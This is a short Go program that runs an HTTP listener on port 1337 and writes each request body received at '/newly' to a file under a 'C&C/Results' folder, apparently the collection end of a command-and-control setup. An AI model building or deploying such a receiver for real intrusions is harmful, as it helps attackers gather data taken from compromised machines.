package main

import (
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
)

func main() {
	http.HandleFunc("/newly", func(w http.ResponseWriter, r *http.Request) {
		WriteFileToRoot(w, r)
	})
	http.ListenAndServe(":1337", nil)
}

func ReceiveBody(r *http.Request) []byte {
	buf, err := ioutil.ReadAll(r.Body)
	if err != nil {
		panic(err)
	}
	return buf
}

func WriteFileToRoot(w http.ResponseWriter, r *http.Request) {
	bornFile, err := os.Create("./C&C/Results/newly.txt")
	if err != nil {
		log.Fatal(err)
	}
	io.WriteString(bornFile, string(ReceiveBody(r)))
	defer bornFile.Close()
	fmt.Println("File written successfully")
}
